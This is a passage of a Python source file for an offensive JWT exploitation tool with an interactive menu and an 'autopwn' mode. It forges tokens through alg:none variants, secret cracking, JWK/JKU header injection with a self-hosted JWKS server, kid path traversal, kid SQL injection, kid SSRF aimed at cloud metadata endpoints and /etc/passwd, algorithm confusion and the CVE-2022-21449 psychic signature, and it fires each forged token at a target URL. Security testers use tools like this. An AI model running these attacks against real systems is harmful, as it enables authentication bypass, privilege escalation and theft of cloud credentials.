    # Try all 7 case variations — some parsers accept non-lowercase "none"
    none_variants = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "nonE"]
    print(Fore.CYAN + f"\n[*] Testing {len(none_variants)} alg:none case variations...")

    for variant in none_variants:
        h = dict(header)
        h["alg"] = variant
        forged = manual_none_token(h, modified_payload)
        print_result(f"alg:{variant} Bypass", forged, modified_payload, h)
        check_url(forged, url)
        if CONFIG.get("autopwn"):
            continue
        ans = input(Fore.CYAN + "[?] Continue to next variant? [Y/n]: ").strip().lower()
        if ans == "n":
            break


def attack_weak_signing_key(token, wordlist, url=None):
    header = get_header(token)
    algorithm = header.get("alg", "HS256")
    print(Fore.CYAN + f"[*] Algorithm: {algorithm}")

    # Prompt for wordlist if not valid path
    while not wordlist or not os.path.isfile(os.path.expanduser(wordlist)):
        wordlist = input(Fore.YELLOW + "Enter path to wordlist file: ").strip()
        if not wordlist:
            print(Fore.RED + "[-] No wordlist path provided. Exiting.")
            return
        if not os.path.isfile(os.path.expanduser(wordlist)):
            print(Fore.RED + f"[-] File not found: {wordlist}")

    wordlist = os.path.expanduser(wordlist)

    # ── hashcat (GPU) path ──────────────────────────────────────
    if CONFIG.get("use_hashcat"):
        print(Fore.CYAN + "[*] 🎮 Using hashcat (GPU mode) for cracking...")
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
            tf.write(token + "\n")
            token_file = tf.name
        try:
            result = subprocess.run(
                ["hashcat", "-a", "0", "-m", "16500", "--quiet", token_file, wordlist],
                capture_output=True, text=True, timeout=3600
            )
            output = result.stdout + result.stderr
            cracked = None
            for line in output.splitlines():
                # hashcat format for mode 16500: <token>:<secret>
                if line.count(".") >= 2 and ":" in line:
                    cracked = line.split(":")[-1].strip()
                    break
            if cracked:
                print(Fore.GREEN + f"[+] hashcat cracked secret: {cracked}")
                _use_cracked_secret(token, cracked, algorithm, header, url)
            else:
                print(Fore.RED + "[-] hashcat did not crack the secret.")
                if result.returncode not in (0, 1):
                    print(Fore.RED + f"[!] hashcat stderr: {result.stderr[:300]}")
        except FileNotFoundError:
            print(Fore.RED + "[!] hashcat not found in PATH — falling back to Python threaded mode")
            CONFIG["use_hashcat"] = False  # retry below
        finally:
            try:
                os.unlink(token_file)
            except OSError:
                pass
        if CONFIG.get("use_hashcat"):
            return  # hashcat ran (hit or miss) — done

    # ── Python threaded brute force ─────────────────────────────
    print(Fore.CYAN + "[*] ⚡ Threaded brute force (50 workers) starting...")
    found_event  = threading.Event()
    found_result = [None]
    lock         = threading.Lock()

    def try_secret(secret):
        if found_event.is_set():
            return None
        try:
            jwt.decode(token, secret, algorithms=[algorithm],
                       options={"verify_exp": False})
            with lock:
                if not found_event.is_set():
                    found_event.set()
                    found_result[0] = secret
            return secret
        except (jwt.InvalidSignatureError, jwt.DecodeError):
            return None
        except Exception:
            return None

    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        secrets = [ln.strip() for ln in f if ln.strip()]

    print(Fore.CYAN + f"[*] Loaded {len(secrets):,} candidates from wordlist")

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(try_secret, s): s for s in secrets}
        checked = 0
        for future in as_completed(futures):
            checked += 1
            if found_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                break
            if checked % 5000 == 0:
                print(Fore.CYAN + f"[*] Checked {checked:,}/{len(secrets):,}...", end="\r")

    if found_result[0]:
        secret = found_result[0]
        print(Fore.GREEN + f"\n[+] ✅ Secret cracked: {secret}")
        _use_cracked_secret(token, secret, algorithm, header, url)
    else:
        print(Fore.RED + f"\n[-] No secret found in {len(secrets):,} candidates.")


def _use_cracked_secret(token, secret, algorithm, header, url):
    """Edit payload and re-sign once a secret is cracked."""
    try:
        decoded = jwt.decode(token, secret, algorithms=[algorithm],
                             options={"verify_exp": False})
    except Exception:
        decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)
    modified_token   = jwt.encode(modified_payload, secret, algorithm=algorithm)
    print_result("Weak Signing Key (Cracked)", modified_token, modified_payload, header)
    check_url(modified_token, url)

def attack_jwk_header_injection(token, url=None):
    private_key = generate_rsa_keypair()
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Header:")
    header = get_header(token)
    modified_header = interactive_edit_dict("Token header", header)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    pub = private_key.public_key().public_numbers()
    jwk = {
        "kty": "RSA",
        "kid": modified_header.get("kid", "custom"),
        "e": base64.urlsafe_b64encode(pub.e.to_bytes((pub.e.bit_length()+7)//8, 'big')).rstrip(b'=').decode(),
        "n": base64.urlsafe_b64encode(pub.n.to_bytes((pub.n.bit_length()+7)//8, 'big')).rstrip(b'=').decode()
    }
    modified_header["jwk"] = jwk
    modified_header["alg"] = "RS256"

    modified_token = jwt.encode(modified_payload, private_key, algorithm='RS256', headers=modified_header)
    print_result("JWK Header Injection", modified_token, modified_payload, modified_header)
    check_url(modified_token, url)

def attack_jku_header_injection(token, url=None):
    private_key     = generate_rsa_keypair()
    decoded_payload = decode_token(token)
    decoded_header  = get_header(token)

    print(Fore.CYAN + "\n[+] Edit JWT Header:")
    modified_header = interactive_edit_dict("Token header", decoded_header)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded_payload)

    pub = private_key.public_key().public_numbers()
    e   = base64.urlsafe_b64encode(pub.e.to_bytes((pub.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
    n   = base64.urlsafe_b64encode(pub.n.to_bytes((pub.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

    kid  = modified_header.get("kid", "custom_kid")
    jwk  = {"kty": "RSA", "e": e, "n": n, "kid": kid}
    jwks = {"keys": [jwk]}

    # ── Auto-host the JWKS (no external service needed) ──────────
    jku_url = None
    server  = None
    port    = find_free_port(8888)

    if CONFIG.get("autopwn"):
        # Autopwn: silently start server, use LAN IP
        try:
            server  = start_jwks_server(jwks, port=port)
            jku_url = f"http://{get_lan_ip()}:{port}/.well-known/jwks.json"
            print(Fore.GREEN + f"[AUTOPWN] 🌐 JWKS server auto-started: {jku_url}")
        except Exception as ex:
            print(Fore.YELLOW + f"[AUTOPWN] Could not start JWKS server: {ex} — skipping JKU")
            return
    else:
        try:
            server   = start_jwks_server(jwks, port=port)
            lan_ip   = get_lan_ip()
            auto_url = f"http://{lan_ip}:{port}/.well-known/jwks.json"
            print(Fore.GREEN + f"\n[+] 🌐 JWKS server started automatically!")
            print(Fore.GREEN + f"[+] Serving at: {auto_url}")
            print(Fore.CYAN  + "[*] The target server must be able to reach your machine at this IP.")
            use_auto = input(Fore.CYAN + "[?] Use this auto-hosted URL? [Y/n]: ").strip().lower()
            if use_auto == "n":
                server.shutdown()
                server = None
                print(Fore.YELLOW + "[*] JWKS content to host manually:")
                print(Fore.YELLOW + json.dumps(jwks, indent=4))
                input(Fore.CYAN + "Press Enter once you've hosted the JWKS...")
                jku_url = input(Fore.CYAN + "[?] Enter your hosted JWKS URL: ").strip()
            else:
                jku_url = auto_url
        except Exception as ex:
            print(Fore.YELLOW + f"[!] Could not auto-host JWKS server: {ex}")
            print(Fore.YELLOW + "[*] JWKS content to host manually:")
            print(Fore.YELLOW + json.dumps(jwks, indent=4))
            input(Fore.CYAN + "Press Enter once you've hosted the JWKS...")
            jku_url = input(Fore.CYAN + "[?] Enter your hosted JWKS URL: ").strip()

    modified_header["jku"] = jku_url
    modified_header["kid"] = kid
    modified_header["alg"] = "RS256"

    modified_token = jwt.encode(modified_payload, private_key, algorithm='RS256', headers=modified_header)
    print_result("JKU Header Injection (auto-hosted JWKS)", modified_token, modified_payload, modified_header)
    check_url(modified_token, url)

    if server and not CONFIG.get("autopwn"):
        input(Fore.CYAN + "\n[?] Press Enter to shut down the JWKS server...")
        server.shutdown()
        print(Fore.YELLOW + "[*] JWKS server stopped.")

def attack_kid_traversal(token, url=None):
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    devnull_paths = [
        # ── Linux / macOS ─────────────────────────────────────────
        "/dev/null",
        "../dev/null",
        "../../dev/null",
        "../../../dev/null",
        "../../../../dev/null",
        "file:///dev/null",
        "../////dev/null",
        "%2e%2e/%2e%2e/%2e%2e/dev/null",
        "dev/null",
        "./../../../dev/null",
        # ── Windows — forward-slash variants ──────────────────────
        "C:/Windows/win.ini",
        "../../../Windows/win.ini",
        "../../../../Windows/win.ini",
        "C:/inetpub/wwwroot/web.config",
        "C:/boot.ini",
        # ── Windows — backslash variants ──────────────────────────
        "C:\\Windows\\win.ini",
        "..\\..\\..\\Windows\\win.ini",
        "..\\..\\..\\..\\Windows\\win.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        # ── Windows — URL-encoded variants ────────────────────────
        "C%3A%5CWindows%5Cwin.ini",
        "..%5C..%5C..%5CWindows%5Cwin.ini",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
    ]

    for kid in devnull_paths:
        try:
            header = {"kid": kid, "alg": "HS256"}
            forged_token = jwt.encode(modified_payload, '', algorithm='HS256', headers=header)
            print_result(f"KID Path Traversal Attempt → {kid}", forged_token, modified_payload, header)
            check_url(forged_token, url)
        except Exception as e:
            print(Fore.RED + f"[!] Error with KID path '{kid}': {str(e)}")


def attack_kid_sqli(token, url=None):
    """
    KID SQL Injection — inject SQL payloads into the kid header.
    When the server uses kid to query a DB for the signing key, UNION SELECT
    lets the attacker control the returned key value, making signature forgery trivial.
    """
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    # (kid_payload, secret_used_to_sign)
    # The secret must match what the SQL injection makes the DB return
    sqli_payloads = [
        ("' UNION SELECT 'secret'-- -",               "secret"),
        ("' UNION SELECT 'hacked'-- -",               "hacked"),
        ("\" UNION SELECT 'secret'-- -",              "secret"),
        ("' UNION SELECT 'secret' FROM dual-- -",     "secret"),
        ("1 UNION SELECT 'secret'-- -",               "secret"),
        ("' OR '1'='1",                               ""),
        ("' OR 1=1-- -",                              ""),
        ("admin'-- -",                                ""),
        ("' UNION SELECT NULL-- -",                   ""),
        ("'; SELECT 'secret'-- -",                    "secret"),
    ]

    print(Fore.CYAN + f"\n[*] Testing {len(sqli_payloads)} KID SQL Injection payloads...")
    for kid_val, secret in sqli_payloads:
        try:
            hdr          = {"kid": kid_val, "alg": "HS256"}
            forged_token = jwt.encode(modified_payload, secret, algorithm='HS256', headers=hdr)
            print_result(
                f"KID SQLi  kid={kid_val!r}  secret={secret!r}",
                forged_token, modified_payload, hdr
            )
            check_url(forged_token, url)
        except Exception as e:
            print(Fore.RED + f"[!] Error with SQLi payload '{kid_val}': {e}")


def attack_kid_ssrf(token, url=None):
    """
    KID SSRF — set kid to internal/metadata URLs.
    When the server fetches the key from the kid URL it makes an outbound request,
    which can be redirected to internal services (AWS metadata, Redis, etc.).
    """
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",                           # AWS IMDSv1
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS IAM role
        "http://metadata.google.internal/computeMetadata/v1/",                # GCP metadata
        "http://100.100.100.200/latest/meta-data/",                           # Alibaba Cloud
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",    # Azure IMDS
        "http://127.0.0.1:80/",
        "http://localhost:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:6379/",                                             # Redis
        "http://127.0.0.1:9200/",                                             # Elasticsearch
        "http://127.0.0.1:5984/",                                             # CouchDB
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/info",                                         # Redis via DICT
    ]

    print(Fore.CYAN + f"\n[*] Testing {len(ssrf_payloads)} KID SSRF payloads...")
    for ssrf_kid in ssrf_payloads:
        try:
            hdr          = {"kid": ssrf_kid, "alg": "HS256"}
            forged_token = jwt.encode(modified_payload, '', algorithm='HS256', headers=hdr)
            print_result(f"KID SSRF → {ssrf_kid}", forged_token, modified_payload, hdr)
            check_url(forged_token, url)
        except Exception as e:
            print(Fore.RED + f"[!] Error with SSRF payload '{ssrf_kid}': {e}")


def jwt_algorithm_confusion_attack(token, url=None):
    
    key_path = None

    print(Fore.YELLOW + "\n[!] JWT Algorithm Confusion Attack Selected")
    print(Fore.CYAN + "Choose the method of confusion:")
    print("  1. Known Public Key")
    print("  2. Without Known Key (Signature Forgery via sig2n)")
    print("  3. Path Traversal for Public Key")

    choice = input(Fore.YELLOW + "Enter your choice : ").strip()

    if choice == "1":
        print("\n[*] You selected: Known Public Key")
        key_path = input(Fore.YELLOW + "Enter the path to the PEM public key file (e.g. key.pem) [Press Enter or 0 to skip]: ").strip()
        
        if key_path == "" or key_path == "0":
            print("[*] Skipping Known Public Key method.\n")
            return
        
        if not os.path.isfile(key_path):
            print(f"[!] File not found: {key_path}")
            return

    elif choice == "2":
        print("\n[*] You selected: Without Known Key (Signature Forgery)")
        print(Fore.CYAN + "[*] Please log out and log back in to the server to receive a new JWT token.")
        print()
        token2 = input(Fore.YELLOW + "Enter the second JWT token you received from the server: ").strip()

        # Run sig2n with both tokens
        try:
            sig2n_cmd = ["docker", "run", "--rm", "-it", "portswigger/sig2n", token, token2]
            print()
            print(Fore.CYAN + "[*] Running sig2n to analyze and forge signature...\n")
            result = subprocess.run(sig2n_cmd, capture_output=True, text=True)

            # Parse keys and JWTs from output
            keys = []
            lines = result.stdout.splitlines()
            current = {}

            for line in lines:
                line = line.strip()
                if line.startswith("Base64 encoded"):
                    if current:
                        keys.append(current)
                        current = {}
                    key_type = "x509" if "x509" in line else "pkcs1"
                    current["type"] = key_type
                    current["key"] = line.split(":", 1)[1].strip()
                elif line.startswith("Tampered JWT:"):
                    current["jwt"] = line.split(":", 1)[1].strip()

            if current:
                keys.append(current)

            if not keys:
                print(Fore.RED + "[-] No keys found in sig2n output.")
                return

            # Print keys with numbers
            print(Fore.GREEN + "\n[+] Extracted Keys and Tampered Tokens:\n")
            for i, k in enumerate(keys, 1):
                print(Fore.YELLOW + f"[{i}] {k['type']} key:")
                print(f"    Base64 encoded {k['type']} key: " + Fore.CYAN + f"{k['key']}")
                print(f"    Tampered JWT: " + Fore.YELLOW + f"{k['jwt']}\n")

            # Manual testing
            print(Fore.CYAN + "[*] Now manually test the tampered token using cookie change in Burp or browser.")

            # Prompt for key number
            selected_index = input(Fore.YELLOW + "[?] Enter the key number to use from the above output (e.g., 1, 2): ").strip()

            try:
                selected_index = int(selected_index) - 1
                if 0 <= selected_index < len(keys):
                    selected_b64_key = keys[selected_index]["key"]

                    # Decode base64 and write as PEM
                    decoded_key = base64.b64decode(selected_b64_key.encode())
                    key_path = "key.pem"

                    with open(key_path, "wb") as f:
                        f.write(decoded_key)

                    print(Fore.GREEN + f"[+] Key written to {key_path}")
                else:
                    print(Fore.RED + "[!] Invalid number entered.")
                    return

            except ValueError:
                print(Fore.RED + "[!] Invalid input. Please enter a number.")
                return

            if result.stderr:
                print(Fore.RED + "[-] sig2n Error Output:\n" + result.stderr)

        except Exception as e:
            print()
            print(Fore.RED + f"[!] Error running sig2n: {e}")
            return


    elif choice == "3":
        print(Fore.CYAN + "\n[*] You selected: Path Traversal for Public Key")

        base_url = input(Fore.YELLOW + "Enter the base URL: ").strip().rstrip('/')

        common_paths = [
            ".well-known/jwks.json",
            "jwks.json",
            "key.pem",
            "public.pem",
            "keys/public.pem",
            "static/key.pem",
            "static/public.pem",
            "cert.pem",
            "certs.pem",
            "certs/public.pem",
            ".well-known/openid-configuration"
        ]

        found_key = None

        print(Fore.CYAN + "\n[*] Trying common public key locations...")

        for path in common_paths:
            try:
                full_url = f"{base_url}/{path}"
                print(Fore.YELLOW + f"  [>] Trying: {full_url}")
                response = requests.get(full_url, timeout=5)

                if response.status_code == 200:
                    content = response.text.strip()

                    # Check if PEM format
                    if "BEGIN PUBLIC KEY" in content:
                        found_key = content
                        print(Fore.GREEN + f"  [+] Found PEM public key at {full_url}")
                        print()
                        print(Fore.CYAN + f"Public Key :\n {found_key}")
                        break
                    elif "keys" in content and "kty" in content:  # Possible JWKS
                        print(Fore.GREEN + f"  [+] Found JWKS at {full_url}")
                        jwks = response.json()
                        if "keys" in jwks and len(jwks["keys"]) > 0:

                            key_data = jwks["keys"][0]
                            print()
                            print(Fore.CYAN + f"Public Key : \n{jwks}")
                            e = int.from_bytes(base64.urlsafe_b64decode(key_data["e"] + '=='), 'big')
                            n = int.from_bytes(base64.urlsafe_b64decode(key_data["n"] + '=='), 'big')

                            pub = RSAPublicNumbers(e, n).public_key(default_backend())
                            found_key = pub.public_bytes(
                                serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo
                            ).decode()
                            break

                else:
                    print(Fore.RED + f"  [-] Not found: {full_url}")
            except Exception as e:
                print(Fore.RED + f"  [!] Error accessing {path}: {e}")

        if found_key:
            key_path = "key.pem"
            with open(key_path, "w") as f:
                f.write(found_key)
            print(Fore.GREEN + f"\n[+] Public key written to {key_path}")
        else:
            print(Fore.RED + "\n[-] No public key found in known locations.")
            return

    else:
        print(Fore.RED + "[!] Invalid choice. Returning to main menu.")
        return


    # Native Algorithm Confusion Attack
    decoded = decode_token(token)
    header = get_header(token)
    
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)
    
    print(Fore.CYAN + "\n[*] Generating Algorithm Confusion Token...")
    try:
        final_token = manual_hs256_sign(header, modified_payload, key_path)
        print_result("Algorithm Confusion (Public Key as HMAC)", final_token, modified_payload, header)
        check_url(final_token, url)
    except Exception as e:
        print(Fore.RED + f"[-] Error generating token: {e}")


def attack_es256_psychic_signature(token, url=None):
    try:
        header_b64, payload_b64, _ = token.split('.')
        decoded_payload = json.loads(base64.urlsafe_b64decode(pad_b64(payload_b64)))
        decoded_header = json.loads(base64.urlsafe_b64decode(pad_b64(header_b64)))

        # Set alg to ES256
        decoded_header["alg"] = "ES256"

        print(Fore.CYAN + "\n[+] Edit JWT Header:")
        modified_header = interactive_edit_dict("Token header", decoded_header)

        print(Fore.CYAN + "\n[+] Edit JWT Payload:")
        modified_payload = interactive_edit_dict("Token payload", decoded_payload)

        # Re-encode header and payload
        header_str = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).rstrip(b'=').decode()
        payload_str = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).rstrip(b'=').decode()

        # Append dummy signature that bypasses ES256 (CVE-2022-21449)
        fake_signature = "MAYCAQACAQA"
        forged_token = f"{header_str}.{payload_str}.{fake_signature}"

        print_result("ES256 Psychic Signature Bypass (CVE-2022-21449)", forged_token, modified_payload, modified_header)
        check_url(forged_token, url)

    except Exception as e:
        print(Fore.RED + f"[-] Error during ES256 attack: {str(e)}")


# ──────────────────────────────────────────────────────────────
#  ATTACK #12 — JWT LIBRARY FINGERPRINTING
# ──────────────────────────────────────────────────────────────

# Error signatures → (library name, version hint, known CVEs list)
_LIB_SIGNATURES = [
    # PyJWT
    ("Not enough segments",            "PyJWT (Python)",          ["CVE-2022-29217 (alg confusion, <2.4.0)", "CVE-2015-9235 (alg:none, <1.0.0)"]),
    ("Invalid header string",          "PyJWT (Python)",          ["CVE-2022-29217"]),
    ("Invalid header padding",         "PyJWT (Python)",          ["CVE-2022-29217"]),
    # jsonwebtoken (Node)
    ("jwt malformed",                  "jsonwebtoken (Node.js)",   ["CVE-2022-23529 (<9.0.0 — secret injection)", "CVE-2015-9235 (alg:none)"]),
    ("invalid token",                  "jsonwebtoken (Node.js)",   ["CVE-2022-23529", "CVE-2022-23540"]),
    ("Unexpected token",               "jsonwebtoken (Node.js)",   ["CVE-2022-23529"]),
    # jjwt (Java)
    ("JWT strings must contain exactly 2 period", "jjwt (Java)", ["CVE-2019-17195 (key confusion, <0.11.1)"]),
    ("Unable to read JSON value",      "jjwt (Java)",             ["CVE-2019-17195"]),
    # go-jwt / golang-jwt
    ("token contains an invalid number of segments", "golang-jwt / go-jwt (Go)", ["CVE-2020-26160 (kid path traversal, <3.2.1)"]),
    ("token is malformed",             "golang-jwt / go-jwt (Go)", ["CVE-2020-26160"]),
    # php-jwt (firebase/php-jwt)
    ("Wrong number of segments",       "firebase/php-jwt (PHP)",  ["CVE-2021-46143 (invalid curve attack, <6.0.0)"]),
    ("Syntax error",                   "firebase/php-jwt (PHP)",  ["CVE-2021-46143"]),
    # auth0/java-jwt
    ("The token was expected to have 3 parts", "auth0/java-jwt (Java)", ["CVE-2019-17195"]),
    # ruby-jwt
    ("Not enough or too many segments","ruby-jwt (Ruby)",          ["no critical public CVEs — keep lib updated"]),
    # jose / panva
    ("JWTMalformed",                   "jose (Node.js / browser)", ["no critical public CVEs — keep lib updated"]),
]


def fingerprint_jwt_library(token, url=None):
    """
    Send malformed tokens to the target to fingerprint the JWT library in use.
    Match error message patterns in the HTTP response body to identify the library
    and display known CVEs relevant to that version/library.
    """
    if not url:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] No --url — skipping library fingerprint.")
            return
        url = input(Fore.YELLOW + "Enter URL endpoint for fingerprinting (receives the token): ").strip()
        if not url:
            print(Fore.RED + "No URL provided. Skipping.")
            return

    print(Fore.CYAN + "\n" + "═" * 64)
    print(Fore.CYAN + "  🔬  JWT LIBRARY FINGERPRINTING")
    print(Fore.CYAN + "═" * 64)

    session = requests.Session()
    if CONFIG["proxy"]:
        session.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
    session.verify = CONFIG["ssl_verify"]
    timeout = CONFIG["timeout"]

    # Malformed probes: each triggers a different error code path in most libs
    probes = [
        "definitely.not.a.valid.jwt",          # extra segments
        "eyJhbGciOiJIUzI1NiJ9.bad-payload.",   # bad payload encoding
        "X.Y",                                  # too few segments
        "X.Y.Z.W",                              # too many segments
    ]

    found_library = None
    found_cves    = []

    delivery_attempts = [
        lambda tok: {"headers": {"Authorization": f"Bearer {tok}"}},
        lambda tok: {"cookies": {"jwt": tok}},
        lambda tok: {"headers": {"X-Auth-Token": tok}},
    ]

    print(Fore.CYAN + f"[*] Probing {url} with {len(probes)} malformed tokens × {len(delivery_attempts)} delivery methods...")

    for probe in probes:
        for delivery_fn in delivery_attempts:
            kwargs = delivery_fn(probe)
            try:
                resp = session.get(url, timeout=timeout, **kwargs)
                body = resp.text
                for sig, lib_name, cves in _LIB_SIGNATURES:
                    if sig.lower() in body.lower():
                        found_library = lib_name
                        found_cves    = cves
                        break
            except Exception:
                continue
            if found_library:
                break
        if found_library:
            break

    print()
    if found_library:
        print(Fore.GREEN + Style.BRIGHT + f"[✅] Library identified: {found_library}")
        print(Fore.RED   + "    Known CVEs for this library:")
        for cve in found_cves:
            print(Fore.RED + f"      ✦  {cve}")
        print(Fore.YELLOW + "\n[*] Recommendation: Run targeted attacks for the CVEs listed above.")
        # Record as a finding
        CONFIG["findings"].append({
            "attack":        "Library Fingerprint",
            "token":         probe,
            "payload":       {},
            "header":        {},
            "verified":      True,
            "verify_reason": f"Library identified: {found_library}",
            "delivery":      "fingerprint probe",
            "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        })
    else:
        print(Fore.YELLOW + "[~] Could not fingerprint the library — error messages may be suppressed.")
        print(Fore.YELLOW + "    Try --proxy to inspect responses manually in Burp Suite.")

    print(Fore.CYAN + "═" * 64)



def run_autopwn(token, url, wordlist=None):
    """Run all automatable attack vectors non-interactively and test each against URL."""
    if not url:
        url = input(Fore.YELLOW + "[AUTOPWN] Enter target URL: ").strip()
        if not url:
            print(Fore.RED + "[-] URL required for --autopwn. Exiting.")
            return

    print(Fore.YELLOW + "\n" + "\u2550" * 64)
    print(Fore.YELLOW + "  \U0001f916  AUTOPWN MODE \u2014 Testing all automatable attack vectors")
    print(Fore.YELLOW + "\u2550" * 64)
    if CONFIG.get("escalate_role"):
        print(Fore.CYAN + f"[*] Role escalation target : '{CONFIG['escalate_role']}'")
    if CONFIG.get("strip_exp"):
        print(Fore.CYAN + "[*] exp/nbf stripping      : ENABLED")
    print()

    autopwn_attacks = [
        ("Null Signature",              attack_null_signature),
        ("Unverified Signature",        attack_unverified_signature),
        ("alg:none \u2014 7 variants",  attack_flawed_verification),
        ("JWK Header Injection",        attack_jwk_header_injection),
        ("JKU Header Injection",        attack_jku_header_injection),
        ("KID Path Traversal",          attack_kid_traversal),
        ("KID SQL Injection",           attack_kid_sqli),
        ("KID SSRF",                    attack_kid_ssrf),
        ("ES256 Psychic Signature",     attack_es256_psychic_signature),
        ("Library Fingerprint",         fingerprint_jwt_library),
    ]
    if wordlist:
        autopwn_attacks.append(
            ("Weak Key Brute Force", lambda t, u: attack_weak_signing_key(t, wordlist, u))
        )

    for name, fn in autopwn_attacks:
        print(Fore.CYAN + f"\n{chr(9472) * 64}")
        print(Fore.CYAN + f"[AUTOPWN] \u25b6  {name}")
        print(Fore.CYAN + f"{chr(9472) * 64}")
        try:
            fn(token, url)
        except Exception as e:
            print(Fore.RED + f"[AUTOPWN] \u2717  {name} \u2014 error: {e}")

    print(Fore.YELLOW + f"\n{chr(9552) * 64}")
    print(Fore.YELLOW + "[AUTOPWN] Scan complete.")
    print(Fore.YELLOW + "[AUTOPWN] Skipped (require manual input):")
    print(Fore.YELLOW + "   \u21b7 Algorithm Confusion  (needs key file or second token for sig2n)")
    print(Fore.YELLOW + f"{chr(9552) * 64}\n")


def main():
    print_banner()

    parser = argparse.ArgumentParser(description="JWT Exploitation Tool")
    parser.add_argument("token",              help="JWT token to test")
    parser.add_argument("-w", "--wordlist",   help="Wordlist path (for weak signing key brute force)")
    parser.add_argument("--url",              help="Target endpoint URL to test tokens against")
    parser.add_argument("--proxy",            help="Proxy URL for traffic routing (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--no-ssl-verify",    action="store_true", help="Disable SSL certificate verification (useful for self-signed certs)")
    parser.add_argument("--timeout",          type=int, default=10, metavar="SEC", help="HTTP request timeout in seconds (default: 10)")
    parser.add_argument("--autopwn",          action="store_true", help="Run ALL automatable attacks non-interactively and test each against --url")
    parser.add_argument("--escalate-role",    metavar="ROLE", help="In autopwn mode, auto-set role/admin/sub claims to this value (e.g. admin)")
    parser.add_argument("--strip-exp",        action="store_true", help="Remove nbf/iat and push exp 10 years forward before signing every token")
    parser.add_argument("--hashcat",          action="store_true", help="Use GPU hashcat for brute force instead of Python threaded mode")
    parser.add_argument("--decode",           action="store_true", help="Decode and analyse the token without attacking (recon mode)")
    parser.add_argument("-o", "--output",     metavar="FILE", help="Save report to this file after the session")
    parser.add_argument("--format",           choices=["json", "txt", "md"], default="json", metavar="FMT", help="Report format: json (default), txt, or md")
    args = parser.parse_args()

    # Populate global config from parsed args
    CONFIG["proxy"]          = args.proxy
    CONFIG["ssl_verify"]     = not args.no_ssl_verify
    CONFIG["timeout"]        = args.timeout
    CONFIG["original_token"] = args.token
    CONFIG["autopwn"]        = args.autopwn
    CONFIG["escalate_role"]  = args.escalate_role
    CONFIG["strip_exp"]      = args.strip_exp
    CONFIG["use_hashcat"]    = args.hashcat
    CONFIG["output_file"]    = args.output
    CONFIG["output_format"]  = args.format

    # Always scan payload for embedded secrets on load
    scan_token_secrets(args.token)

    # --decode mode: full recon, then exit
    if args.decode:
        decode_mode(args.token)
        return

    # Print attack recommendations based on token header (quick, always shown)
    header  = get_header(args.token)
    payload = decode_token(args.token)
    recommend_attacks(header, payload)
    print()

    # Autopwn mode — skip menu, run everything automatically
    if args.autopwn:
        run_autopwn(args.token, args.url, wordlist=args.wordlist)
        if CONFIG["output_file"]:
            save_report(CONFIG["output_file"], CONFIG["output_format"])
        return

    attacks = {
        "1":  ("Unverified Signature",                            attack_unverified_signature),
        "2":  ("Flawed Signature Verification (alg:none)",        attack_flawed_verification),
        "3":  ("Weak Signing Key Brute Force",                    lambda t, u: attack_weak_signing_key(t, args.wordlist, u)),
        "4":  ("JWK Header Injection",                            attack_jwk_header_injection),
        "5":  ("JKU Header Injection (auto-hosted JWKS)",         attack_jku_header_injection),
        "6":  ("KID Header Path Traversal",                       attack_kid_traversal),
        "7":  ("Algorithm Confusion (Public Key as HMAC)",        jwt_algorithm_confusion_attack),
        "8":  ("ES256 Psychic Signature Bypass (CVE-2022-21449)", attack_es256_psychic_signature),
        "9":  ("Null Signature (Signature Stripping)",            attack_null_signature),
        "10": ("KID SQL Injection",                               attack_kid_sqli),
        "11": ("KID SSRF",                                        attack_kid_ssrf),
        "12": ("JWT Library Fingerprinting",                      fingerprint_jwt_library),
    }

    print(Fore.CYAN + "[*] Choose an attack method:")
    for k, v in attacks.items():
        print(Fore.CYAN + f"  {k:>2}. {v[0]}")
    choice = input(Fore.YELLOW + "\n[?] Enter choice: ").strip()

    if choice in attacks:
        attacks[choice][1](args.token, args.url)
    else:
        print(Fore.RED + "[-] Invalid choice")

    if CONFIG["output_file"]:
        save_report(CONFIG["output_file"], CONFIG["output_format"])

if __name__ == "__main__":
    main()
